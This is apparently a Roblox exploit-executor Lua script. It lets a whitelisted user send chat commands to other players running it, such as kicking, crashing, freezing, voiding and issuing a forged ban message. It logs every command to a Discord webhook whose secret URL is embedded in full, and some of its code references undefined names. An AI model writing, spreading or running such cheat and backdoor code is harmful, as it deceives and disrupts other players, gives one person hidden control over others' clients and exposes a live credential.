local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local AnalyticsService = game:GetService("RbxAnalyticsService")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local EnviromentRemote = Actions:WaitForChild("Environmental", 9e9)
local FE = game:GetService("ReplicatedStorage"):WaitForChild("FE")
local Chat = FE:WaitForChild("Chat", 9e9)

local webhookURL =
    "https://discord.com/api/webhooks/1424223851398696991/dOFxiu4WxLTVC32whg13Chp6pZEFRojhg22Sm9zX6toXcZibdi83lIOzRjEg9Aqslnn4"

local function sendWebhook(command, senderName, target, extra)
    local data = {
        embeds = {{
            title = "📢 Command Executed",
            color = 0x00AEEF,
            fields = {
                {name = "Sender", value = senderName, inline = true},
                {name = "Command", value = tostring(command), inline = true},
                {name = "Target", value = target and target.Name or "N/A", inline = true},
                {name = "Extra", value = extra ~= "" and extra or "None", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local requestfn = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)

    if requestfn then
        pcall(function()
            requestfn({
                Url = webhookURL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(data)
            })
        end)
    end
end

local RevealUsers = {} 

local function AddRevealUser(playerName)
    if not table.find(RevealUsers, playerName) then
        table.insert(RevealUsers, playerName)
    end

    if _G.WindUI then
        _G.WindUI:Notify({
            Title = "Reveal Command Used",
            Content = "Users: " .. table.concat(RevealUsers, ", "),
            Duration = 10
        })
    end
end

local function IsERXPrivate()
    -- UserId check
    if LocalPlayer.UserId == 8244720493 then
        return true
    end

    -- DisplayName check (case-insensitive)
    local display = LocalPlayer.DisplayName:lower()
    if display:find("fuhtwan") then
        return true
    end

    return false
end

-- WindUI Notify if verified
if IsERXPrivate() and _G.WindUI then
    _G.WindUI:Notify({
        Title = "ERX Custom Private",
        Content = "Loaded Private Successfully",
        Duration = 8
    })
end

local PrivateCommands = {}

PrivateCommands[":reveal"] = function(senderName, ...)
    AddRevealUser(senderName)
    Chat:FireServer("EXWLSV")
end


PrivateCommands[":noroot"] = function(target)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        target.Character.HumanoidRootPart.Parent = nil
    end
end

PrivateCommands[":say"] = function(target, msg)
    Chat:FireServer(tostring(msg))
end

PrivateCommands[":fakeban"] = function(target)
    if target then
        target:Kick("You created or used an account to avoid an enforcement action taken against another account within this experience")
        task.delay(1, function()
            warn("You created or used an account to avoid an enforcement action taken against another account within this experience")
        end)
    end
end

PrivateCommands[":kill"] = function(target)
    if EnviromentRemote then
        EnviromentRemote:FireServer(1000)
    end
end

PrivateCommands[":samjumpscare"] = function()
    pcall(function()
        local FileName = "SamKalish.png"
        local Url = "https://cdn.discordapp.com/avatars/128988722837323776/dfe6a8a3dace8d4e88f26a27e46a1862.webp?size=300"

        if isfile(FileName) then delfile(FileName) end
        writefile(FileName, game:HttpGet(Url))

        local ImageAsset = getcustomasset(FileName)

        for _, v in ipairs(game:GetDescendants()) do
            if v:IsA("TextLabel") or v:IsA("TextButton") then
                v.Text = ("SAM JUMPSCARE "):rep(15)
            elseif v:IsA("ImageLabel") or v:IsA("ImageButton") then
                v.Image = ImageAsset
            elseif v:IsA("Decal") or v:IsA("Texture") then
                v.Texture = ImageAsset
            elseif v:IsA("BasePart") then
                local d = Instance.new("Decal", v)
                d.Texture = ImageAsset

                local p = Instance.new("ParticleEmitter", v)
                p.Texture = ImageAsset
                p.Rate = 6
                p.Lifetime = NumberRange.new(2,4)
                p.Speed = NumberRange.new(0.5,1.5)
            end
        end
    end)
end

PrivateCommands[":freeze"] = function(target)
    if target and target.Character and target.Character.PrimaryPart then
        target.Character.PrimaryPart.Anchored = true
    end
end

PrivateCommands[":unfreeze"] = function(target)
    if target and target.Character and target.Character.PrimaryPart then
        target.Character.PrimaryPart.Anchored = false
    end
end

PrivateCommands[":trip"] = function(target)
    if target and target.Character and target.Character:FindFirstChild("Humanoid") then
        target.Character.Humanoid.PlatformStand = true
    end
end

PrivateCommands[":bring"] = function(target)
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    if not target then return end
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end

    local lpRoot = LocalPlayer.Character.HumanoidRootPart

    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        target.Character.HumanoidRootPart.CFrame = lpRoot.CFrame + Vector3.new(0, 3, 0)
    end
end

PrivateCommands[":void"] = function(target)
    if target and target.Character and target.Character.PrimaryPart then
        target.Character.PrimaryPart.CFrame *= CFrame.new(0, 99999999, 0)
    end
end

PrivateCommands[":kick"] = function(target, msg)
    if target then target:Kick(msg or "Kicked") end
end

PrivateCommands[":setfps"] = function(target, fpsValue)
    if not fpsValue then return end
    fpsValue = tonumber(fpsValue)
    if not fpsValue then return end

    if setfpscap then
        setfpscap(fpsValue)
    end
end

PrivateCommands[":crash"] = function(target)
    if target then while true do end end
end

PrivateCommands[":prcprivate"] = function(target)
    for _, name in ipairs(PrivateMembers) do
        local p = Players:FindFirstChild(name)
        if p then
            local fake = Instance.new("BoolValue")
            fake.Name = "IsGameMod"
            fake.Parent = p
        end
    end
end

PrivateCommands[":removeprc"] = function(target)
    for _, name in ipairs(PrivateMembers) do
        local p = Players:FindFirstChild(name)
        if p then
            local tag = p:FindFirstChild("IsGameMod")
            if tag then
                tag:Destroy()
            end
        end
    end
end

PrivateCommands[":notify"] = function(target, msg)
    if target and _G.WindUI then
        _G.WindUI:Notify({
            Title = "Notification",
            Content = msg or "No message",
            Duration = 10
        })
    end
end

-- Chat Hook
Chat.OnClientEvent:Connect(function(senderName, message)
    local sender = Players:FindFirstChild(senderName)
    if not sender then return end

    local args = string.split(message, " ")

    local command = args[1]
    local targetName = args[2] or ""
    table.remove(args, 1)
    table.remove(args, 1)

    local extra = table.concat(args, " ")
    local target = Players:FindFirstChild(targetName)

    -- ================================================
    -- 1. Prevent commands from affecting YOU
    --    unless the sender is whitelisted
    -- ================================================
    if target == LocalPlayer then
        local allowed =
            (sender.UserId == 8244720493) or
            (string.find(string.lower(sender.DisplayName), "fuhtwan"))

        if not allowed then
            return
        end
    end

    -- ================================================
    -- 2. Your own commands should never target yourself
    -- ================================================
    if sender == LocalPlayer and target == LocalPlayer then
        return
    end

    -- ================================================
    -- 3. Execute the command normally
    -- ================================================
    if PrivateCommands[command] then
        PrivateCommands[command](target, extra)
        sendWebhook(command, senderName, target, extra)
    end
end)

